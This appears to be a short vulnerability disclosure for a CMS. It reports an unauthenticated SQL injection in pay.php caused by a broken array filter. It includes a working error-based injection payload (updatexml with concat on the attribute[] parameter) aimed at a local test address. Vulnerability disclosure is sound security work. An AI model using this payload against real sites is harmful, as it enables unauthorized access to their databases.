| Compared with the previous injection vulnerability, this vulnerability is more harmful because it can be triggered without logging in to the management account.  The syntax of the cms filter function is wrong, which causes the filter of the array to not take effect [image (1)](https://user-images.githubusercontent.com/32975053/106414663-242a1680-6488-11eb-88eb-e8c38bf3e04f.png) in pay.php： [image](https://user-images.githubusercontent.com/32975053/106414651-196f8180-6488-11eb-8e14-8f234236d288.png)  payload： [http://192.168.0.105/?c=pay&a=cartadd&id=1&quantity=1&attribute[]=123123](http://192.168.0.105/?c=pay&a=cartadd&id=1&quantity=1&attribute%5B%5D=123123)' or updatexml(2,concat(0x7e,(version())),0) or' [image](https://user-images.githubusercontent.com/32975053/106414733-50de2e00-6488-11eb-9189-039497ad7542.png) |
